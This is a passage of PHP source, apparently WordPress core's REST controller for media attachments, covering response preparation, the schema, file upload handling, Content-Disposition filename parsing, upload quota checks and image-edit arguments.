		$new_image_meta = apply_filters( 'wp_edited_image_metadata', $new_image_meta, $new_attachment_id, $attachment_id );

		wp_update_attachment_metadata( $new_attachment_id, $new_image_meta );

		$response = $this->prepare_item_for_response( get_post( $new_attachment_id ), $request );
		$response->set_status( 201 );
		$response->header( 'Location', rest_url( sprintf( '%s/%s/%s', $this->namespace, $this->rest_base, $new_attachment_id ) ) );

		return $response;
	}

	/**
	 * Prepares a single attachment for create or update.
	 *
	 * @since 4.7.0
	 *
	 * @param WP_REST_Request $request Request object.
	 * @return stdClass|WP_Error Post object.
	 */
	protected function prepare_item_for_database( $request ) {
		$prepared_attachment = parent::prepare_item_for_database( $request );

		// Attachment caption (post_excerpt internally).
		if ( isset( $request['caption'] ) ) {
			if ( is_string( $request['caption'] ) ) {
				$prepared_attachment->post_excerpt = $request['caption'];
			} elseif ( isset( $request['caption']['raw'] ) ) {
				$prepared_attachment->post_excerpt = $request['caption']['raw'];
			}
		}

		// Attachment description (post_content internally).
		if ( isset( $request['description'] ) ) {
			if ( is_string( $request['description'] ) ) {
				$prepared_attachment->post_content = $request['description'];
			} elseif ( isset( $request['description']['raw'] ) ) {
				$prepared_attachment->post_content = $request['description']['raw'];
			}
		}

		if ( isset( $request['post'] ) ) {
			$prepared_attachment->post_parent = (int) $request['post'];
		}

		return $prepared_attachment;
	}

	/**
	 * Prepares a single attachment output for response.
	 *
	 * @since 4.7.0
	 *
	 * @param WP_Post         $post    Attachment object.
	 * @param WP_REST_Request $request Request object.
	 * @return WP_REST_Response Response object.
	 */
	public function prepare_item_for_response( $post, $request ) {
		$response = parent::prepare_item_for_response( $post, $request );
		$fields   = $this->get_fields_for_response( $request );
		$data     = $response->get_data();

		if ( in_array( 'description', $fields, true ) ) {
			$data['description'] = array(
				'raw'      => $post->post_content,
				/** This filter is documented in wp-includes/post-template.php */
				'rendered' => apply_filters( 'the_content', $post->post_content ),
			);
		}

		if ( in_array( 'caption', $fields, true ) ) {
			/** This filter is documented in wp-includes/post-template.php */
			$caption = apply_filters( 'get_the_excerpt', $post->post_excerpt, $post );

			/** This filter is documented in wp-includes/post-template.php */
			$caption = apply_filters( 'the_excerpt', $caption );

			$data['caption'] = array(
				'raw'      => $post->post_excerpt,
				'rendered' => $caption,
			);
		}

		if ( in_array( 'alt_text', $fields, true ) ) {
			$data['alt_text'] = get_post_meta( $post->ID, '_wp_attachment_image_alt', true );
		}

		if ( in_array( 'media_type', $fields, true ) ) {
			$data['media_type'] = wp_attachment_is_image( $post->ID ) ? 'image' : 'file';
		}

		if ( in_array( 'mime_type', $fields, true ) ) {
			$data['mime_type'] = $post->post_mime_type;
		}

		if ( in_array( 'media_details', $fields, true ) ) {
			$data['media_details'] = wp_get_attachment_metadata( $post->ID );

			// Ensure empty details is an empty object.
			if ( empty( $data['media_details'] ) ) {
				$data['media_details'] = new stdClass;
			} elseif ( ! empty( $data['media_details']['sizes'] ) ) {

				foreach ( $data['media_details']['sizes'] as $size => &$size_data ) {

					if ( isset( $size_data['mime-type'] ) ) {
						$size_data['mime_type'] = $size_data['mime-type'];
						unset( $size_data['mime-type'] );
					}

					// Use the same method image_downsize() does.
					$image_src = wp_get_attachment_image_src( $post->ID, $size );
					if ( ! $image_src ) {
						continue;
					}

					$size_data['source_url'] = $image_src[0];
				}

				$full_src = wp_get_attachment_image_src( $post->ID, 'full' );

				if ( ! empty( $full_src ) ) {
					$data['media_details']['sizes']['full'] = array(
						'file'       => wp_basename( $full_src[0] ),
						'width'      => $full_src[1],
						'height'     => $full_src[2],
						'mime_type'  => $post->post_mime_type,
						'source_url' => $full_src[0],
					);
				}
			} else {
				$data['media_details']['sizes'] = new stdClass;
			}
		}

		if ( in_array( 'post', $fields, true ) ) {
			$data['post'] = ! empty( $post->post_parent ) ? (int) $post->post_parent : null;
		}

		if ( in_array( 'source_url', $fields, true ) ) {
			$data['source_url'] = wp_get_attachment_url( $post->ID );
		}

		if ( in_array( 'missing_image_sizes', $fields, true ) ) {
			require_once ABSPATH . 'wp-admin/includes/image.php';
			$data['missing_image_sizes'] = array_keys( wp_get_missing_image_subsizes( $post->ID ) );
		}

		$context = ! empty( $request['context'] ) ? $request['context'] : 'view';

		$data = $this->filter_response_by_context( $data, $context );

		$links = $response->get_links();

		// Wrap the data in a response object.
		$response = rest_ensure_response( $data );

		foreach ( $links as $rel => $rel_links ) {
			foreach ( $rel_links as $link ) {
				$response->add_link( $rel, $link['href'], $link['attributes'] );
			}
		}

		/**
		 * Filters an attachment returned from the REST API.
		 *
		 * Allows modification of the attachment right before it is returned.
		 *
		 * @since 4.7.0
		 *
		 * @param WP_REST_Response $response The response object.
		 * @param WP_Post          $post     The original attachment post.
		 * @param WP_REST_Request  $request  Request used to generate the response.
		 */
		return apply_filters( 'rest_prepare_attachment', $response, $post, $request );
	}

	/**
	 * Retrieves the attachment's schema, conforming to JSON Schema.
	 *
	 * @since 4.7.0
	 *
	 * @return array Item schema as an array.
	 */
	public function get_item_schema() {
		if ( $this->schema ) {
			return $this->add_additional_fields_schema( $this->schema );
		}

		$schema = parent::get_item_schema();

		$schema['properties']['alt_text'] = array(
			'description' => __( 'Alternative text to display when attachment is not displayed.' ),
			'type'        => 'string',
			'context'     => array( 'view', 'edit', 'embed' ),
			'arg_options' => array(
				'sanitize_callback' => 'sanitize_text_field',
			),
		);

		$schema['properties']['caption'] = array(
			'description' => __( 'The attachment caption.' ),
			'type'        => 'object',
			'context'     => array( 'view', 'edit', 'embed' ),
			'arg_options' => array(
				'sanitize_callback' => null, // Note: sanitization implemented in self::prepare_item_for_database().
				'validate_callback' => null, // Note: validation implemented in self::prepare_item_for_database().
			),
			'properties'  => array(
				'raw'      => array(
					'description' => __( 'Caption for the attachment, as it exists in the database.' ),
					'type'        => 'string',
					'context'     => array( 'edit' ),
				),
				'rendered' => array(
					'description' => __( 'HTML caption for the attachment, transformed for display.' ),
					'type'        => 'string',
					'context'     => array( 'view', 'edit', 'embed' ),
					'readonly'    => true,
				),
			),
		);

		$schema['properties']['description'] = array(
			'description' => __( 'The attachment description.' ),
			'type'        => 'object',
			'context'     => array( 'view', 'edit' ),
			'arg_options' => array(
				'sanitize_callback' => null, // Note: sanitization implemented in self::prepare_item_for_database().
				'validate_callback' => null, // Note: validation implemented in self::prepare_item_for_database().
			),
			'properties'  => array(
				'raw'      => array(
					'description' => __( 'Description for the object, as it exists in the database.' ),
					'type'        => 'string',
					'context'     => array( 'edit' ),
				),
				'rendered' => array(
					'description' => __( 'HTML description for the object, transformed for display.' ),
					'type'        => 'string',
					'context'     => array( 'view', 'edit' ),
					'readonly'    => true,
				),
			),
		);

		$schema['properties']['media_type'] = array(
			'description' => __( 'Attachment type.' ),
			'type'        => 'string',
			'enum'        => array( 'image', 'file' ),
			'context'     => array( 'view', 'edit', 'embed' ),
			'readonly'    => true,
		);

		$schema['properties']['mime_type'] = array(
			'description' => __( 'The attachment MIME type.' ),
			'type'        => 'string',
			'context'     => array( 'view', 'edit', 'embed' ),
			'readonly'    => true,
		);

		$schema['properties']['media_details'] = array(
			'description' => __( 'Details about the media file, specific to its type.' ),
			'type'        => 'object',
			'context'     => array( 'view', 'edit', 'embed' ),
			'readonly'    => true,
		);

		$schema['properties']['post'] = array(
			'description' => __( 'The ID for the associated post of the attachment.' ),
			'type'        => 'integer',
			'context'     => array( 'view', 'edit' ),
		);

		$schema['properties']['source_url'] = array(
			'description' => __( 'URL to the original attachment file.' ),
			'type'        => 'string',
			'format'      => 'uri',
			'context'     => array( 'view', 'edit', 'embed' ),
			'readonly'    => true,
		);

		$schema['properties']['missing_image_sizes'] = array(
			'description' => __( 'List of the missing image sizes of the attachment.' ),
			'type'        => 'array',
			'items'       => array( 'type' => 'string' ),
			'context'     => array( 'edit' ),
			'readonly'    => true,
		);

		unset( $schema['properties']['password'] );

		$this->schema = $schema;

		return $this->add_additional_fields_schema( $this->schema );
	}

	/**
	 * Handles an upload via raw POST data.
	 *
	 * @since 4.7.0
	 *
	 * @param array $data    Supplied file data.
	 * @param array $headers HTTP headers from the request.
	 * @return array|WP_Error Data from wp_handle_sideload().
	 */
	protected function upload_from_data( $data, $headers ) {
		if ( empty( $data ) ) {
			return new WP_Error(
				'rest_upload_no_data',
				__( 'No data supplied.' ),
				array( 'status' => 400 )
			);
		}

		if ( empty( $headers['content_type'] ) ) {
			return new WP_Error(
				'rest_upload_no_content_type',
				__( 'No Content-Type supplied.' ),
				array( 'status' => 400 )
			);
		}

		if ( empty( $headers['content_disposition'] ) ) {
			return new WP_Error(
				'rest_upload_no_content_disposition',
				__( 'No Content-Disposition supplied.' ),
				array( 'status' => 400 )
			);
		}

		$filename = self::get_filename_from_disposition( $headers['content_disposition'] );

		if ( empty( $filename ) ) {
			return new WP_Error(
				'rest_upload_invalid_disposition',
				__( 'Invalid Content-Disposition supplied. Content-Disposition needs to be formatted as `attachment; filename="image.png"` or similar.' ),
				array( 'status' => 400 )
			);
		}

		if ( ! empty( $headers['content_md5'] ) ) {
			$content_md5 = array_shift( $headers['content_md5'] );
			$expected    = trim( $content_md5 );
			$actual      = md5( $data );

			if ( $expected !== $actual ) {
				return new WP_Error(
					'rest_upload_hash_mismatch',
					__( 'Content hash did not match expected.' ),
					array( 'status' => 412 )
				);
			}
		}

		// Get the content-type.
		$type = array_shift( $headers['content_type'] );

		// Include filesystem functions to get access to wp_tempnam() and wp_handle_sideload().
		require_once ABSPATH . 'wp-admin/includes/file.php';

		// Save the file.
		$tmpfname = wp_tempnam( $filename );

		$fp = fopen( $tmpfname, 'w+' );

		if ( ! $fp ) {
			return new WP_Error(
				'rest_upload_file_error',
				__( 'Could not open file handle.' ),
				array( 'status' => 500 )
			);
		}

		fwrite( $fp, $data );
		fclose( $fp );

		// Now, sideload it in.
		$file_data = array(
			'error'    => null,
			'tmp_name' => $tmpfname,
			'name'     => $filename,
			'type'     => $type,
		);

		$size_check = self::check_upload_size( $file_data );
		if ( is_wp_error( $size_check ) ) {
			return $size_check;
		}

		$overrides = array(
			'test_form' => false,
		);

		$sideloaded = wp_handle_sideload( $file_data, $overrides );

		if ( isset( $sideloaded['error'] ) ) {
			@unlink( $tmpfname );

			return new WP_Error(
				'rest_upload_sideload_error',
				$sideloaded['error'],
				array( 'status' => 500 )
			);
		}

		return $sideloaded;
	}

	/**
	 * Parses filename from a Content-Disposition header value.
	 *
	 * As per RFC6266:
	 *
	 *     content-disposition = "Content-Disposition" ":"
	 *                            disposition-type *( ";" disposition-parm )
	 *
	 *     disposition-type    = "inline" | "attachment" | disp-ext-type
	 *                         ; case-insensitive
	 *     disp-ext-type       = token
	 *
	 *     disposition-parm    = filename-parm | disp-ext-parm
	 *
	 *     filename-parm       = "filename" "=" value
	 *                         | "filename*" "=" ext-value
	 *
	 *     disp-ext-parm       = token "=" value
	 *                         | ext-token "=" ext-value
	 *     ext-token           = <the characters in token, followed by "*">
	 *
	 * @since 4.7.0
	 *
	 * @link https://tools.ietf.org/html/rfc2388
	 * @link https://tools.ietf.org/html/rfc6266
	 *
	 * @param string[] $disposition_header List of Content-Disposition header values.
	 * @return string|null Filename if available, or null if not found.
	 */
	public static function get_filename_from_disposition( $disposition_header ) {
		// Get the filename.
		$filename = null;

		foreach ( $disposition_header as $value ) {
			$value = trim( $value );

			if ( strpos( $value, ';' ) === false ) {
				continue;
			}

			list( $type, $attr_parts ) = explode( ';', $value, 2 );

			$attr_parts = explode( ';', $attr_parts );
			$attributes = array();

			foreach ( $attr_parts as $part ) {
				if ( strpos( $part, '=' ) === false ) {
					continue;
				}

				list( $key, $value ) = explode( '=', $part, 2 );

				$attributes[ trim( $key ) ] = trim( $value );
			}

			if ( empty( $attributes['filename'] ) ) {
				continue;
			}

			$filename = trim( $attributes['filename'] );

			// Unquote quoted filename, but after trimming.
			if ( substr( $filename, 0, 1 ) === '"' && substr( $filename, -1, 1 ) === '"' ) {
				$filename = substr( $filename, 1, -1 );
			}
		}

		return $filename;
	}

	/**
	 * Retrieves the query params for collections of attachments.
	 *
	 * @since 4.7.0
	 *
	 * @return array Query parameters for the attachment collection as an array.
	 */
	public function get_collection_params() {
		$params                            = parent::get_collection_params();
		$params['status']['default']       = 'inherit';
		$params['status']['items']['enum'] = array( 'inherit', 'private', 'trash' );
		$media_types                       = $this->get_media_types();

		$params['media_type'] = array(
			'default'     => null,
			'description' => __( 'Limit result set to attachments of a particular media type.' ),
			'type'        => 'string',
			'enum'        => array_keys( $media_types ),
		);

		$params['mime_type'] = array(
			'default'     => null,
			'description' => __( 'Limit result set to attachments of a particular MIME type.' ),
			'type'        => 'string',
		);

		return $params;
	}

	/**
	 * Handles an upload via multipart/form-data ($_FILES).
	 *
	 * @since 4.7.0
	 *
	 * @param array $files   Data from the `$_FILES` superglobal.
	 * @param array $headers HTTP headers from the request.
	 * @return array|WP_Error Data from wp_handle_upload().
	 */
	protected function upload_from_file( $files, $headers ) {
		if ( empty( $files ) ) {
			return new WP_Error(
				'rest_upload_no_data',
				__( 'No data supplied.' ),
				array( 'status' => 400 )
			);
		}

		// Verify hash, if given.
		if ( ! empty( $headers['content_md5'] ) ) {
			$content_md5 = array_shift( $headers['content_md5'] );
			$expected    = trim( $content_md5 );
			$actual      = md5_file( $files['file']['tmp_name'] );

			if ( $expected !== $actual ) {
				return new WP_Error(
					'rest_upload_hash_mismatch',
					__( 'Content hash did not match expected.' ),
					array( 'status' => 412 )
				);
			}
		}

		// Pass off to WP to handle the actual upload.
		$overrides = array(
			'test_form' => false,
		);

		// Bypasses is_uploaded_file() when running unit tests.
		if ( defined( 'DIR_TESTDATA' ) && DIR_TESTDATA ) {
			$overrides['action'] = 'wp_handle_mock_upload';
		}

		$size_check = self::check_upload_size( $files['file'] );
		if ( is_wp_error( $size_check ) ) {
			return $size_check;
		}

		// Include filesystem functions to get access to wp_handle_upload().
		require_once ABSPATH . 'wp-admin/includes/file.php';

		$file = wp_handle_upload( $files['file'], $overrides );

		if ( isset( $file['error'] ) ) {
			return new WP_Error(
				'rest_upload_unknown_error',
				$file['error'],
				array( 'status' => 500 )
			);
		}

		return $file;
	}

	/**
	 * Retrieves the supported media types.
	 *
	 * Media types are considered the MIME type category.
	 *
	 * @since 4.7.0
	 *
	 * @return array Array of supported media types.
	 */
	protected function get_media_types() {
		$media_types = array();

		foreach ( get_allowed_mime_types() as $mime_type ) {
			$parts = explode( '/', $mime_type );

			if ( ! isset( $media_types[ $parts[0] ] ) ) {
				$media_types[ $parts[0] ] = array();
			}

			$media_types[ $parts[0] ][] = $mime_type;
		}

		return $media_types;
	}

	/**
	 * Determine if uploaded file exceeds space quota on multisite.
	 *
	 * Replicates check_upload_size().
	 *
	 * @since 4.9.8
	 *
	 * @param array $file $_FILES array for a given file.
	 * @return true|WP_Error True if can upload, error for errors.
	 */
	protected function check_upload_size( $file ) {
		if ( ! is_multisite() ) {
			return true;
		}

		if ( get_site_option( 'upload_space_check_disabled' ) ) {
			return true;
		}

		$space_left = get_upload_space_available();

		$file_size = filesize( $file['tmp_name'] );

		if ( $space_left < $file_size ) {
			return new WP_Error(
				'rest_upload_limited_space',
				/* translators: %s: Required disk space in kilobytes. */
				sprintf( __( 'Not enough space to upload. %s KB needed.' ), number_format( ( $file_size - $space_left ) / KB_IN_BYTES ) ),
				array( 'status' => 400 )
			);
		}

		if ( $file_size > ( KB_IN_BYTES * get_site_option( 'fileupload_maxk', 1500 ) ) ) {
			return new WP_Error(
				'rest_upload_file_too_big',
				/* translators: %s: Maximum allowed file size in kilobytes. */
				sprintf( __( 'This file is too big. Files must be less than %s KB in size.' ), get_site_option( 'fileupload_maxk', 1500 ) ),
				array( 'status' => 400 )
			);
		}

		// Include multisite admin functions to get access to upload_is_user_over_quota().
		require_once ABSPATH . 'wp-admin/includes/ms.php';

		if ( upload_is_user_over_quota( false ) ) {
			return new WP_Error(
				'rest_upload_user_quota_exceeded',
				__( 'You have used your space quota. Please delete files before uploading.' ),
				array( 'status' => 400 )
			);
		}

		return true;
	}

	/**
	 * Gets the request args for the edit item route.
	 *
	 * @since 5.5.0
	 *
	 * @return array
	 */
	protected function get_edit_media_item_args() {
		return array(
			'src'       => array(
				'description' => __( 'URL to the edited image file.' ),
				'type'        => 'string',
				'format'      => 'uri',
				'required'    => true,
			),
			'modifiers' => array(
				'description' => __( 'Array of image edits.' ),
				'type'        => 'array',
				'minItems'    => 1,
				'items'       => array(
					'description' => __( 'Image edit.' ),
					'type'        => 'object',
					'required'    => array(
						'type',
						'args',
					),
					'oneOf'       => array(
						array(
							'title'      => __( 'Rotation' ),
							'properties' => array(
								'type' => array(
									'description' => __( 'Rotation type.' ),
									'type'        => 'string',
									'enum'        => array( 'rotate' ),
								),
								'args' => array(
									'description' => __( 'Rotation arguments.' ),
									'type'        => 'object',
									'required'    => array(
										'angle',
									),
									'properties'  => array(
										'angle' => array(
											'description' => __( 'Angle to rotate clockwise in degrees.' ),
											'type'        => 'number',
										),
									),
								),
							),
						),
						array(
							'title'      => __( 'Crop' ),
							'properties' => array(
								'type' => array(
									'description' => __( 'Crop type.' ),
									'type'        => 'string',
									'enum'        => array( 'crop' ),
								),
								'args' => array(
									'description' => __( 'Crop arguments.' ),
									'type'        => 'object',
									'required'    => array(
										'left',
										'top',
										'width',
										'height',
									),
									'properties'  => array(
										'left'   => array(
											'description' => __( 'Horizontal position from the left to begin the crop as a percentage of the image width.' ),
											'type'        => 'number',
										),
										'top'    => array(
											'description' => __( 'Vertical position from the top to begin the crop as a percentage of the image height.' ),
											'type'        => 'number',
										),
										'width'  => array(
											'description' => __( 'Width of the crop as a percentage of the image width.' ),
											'type'        => 'number',
										),
										'height' => array(
											'description' => __( 'Height of the crop as a percentage of the image height.' ),
											'type'        => 'number',
										),
									),
								),
							),
						),
					),
				),
			),
			'rotation'  => array(
				'description'      => __( 'The amount to rotate the image clockwise in degrees. DEPRECATED: Use `modifiers` instead.' ),
				'type'             => 'integer',
				'minimum'          => 0,
				'exclusiveMinimum' => true,
				'maximum'          => 360,
				'exclusiveMaximum' => true,
			),
			'x'         => array(
				'description' => __( 'As a percentage of the image, the x position to start the crop from. DEPRECATED: Use `modifiers` instead.' ),
				'type'        => 'number',
				'minimum'     => 0,
				'maximum'     => 100,
			),
			'y'         => array(
				'description' => __( 'As a percentage of the image, the y position to start the crop from. DEPRECATED: Use `modifiers` instead.' ),
				'type'        => 'number',
				'minimum'     => 0,
				'maximum'     => 100,
			),
			'width'     => array(
				'description' => __( 'As a percentage of the image, the width to crop the image to. DEPRECATED: Use `modifiers` instead.' ),
				'type'        => 'number',
				'minimum'     => 0,
				'maximum'     => 100,
			),
			'height'    => array(
				'description' => __( 'As a percentage of the image, the height to crop the image to. DEPRECATED: Use `modifiers` instead.' ),
				'type'        => 'number',
				'minimum'     => 0,
				'maximum'     => 100,
			),
		);
	}

}
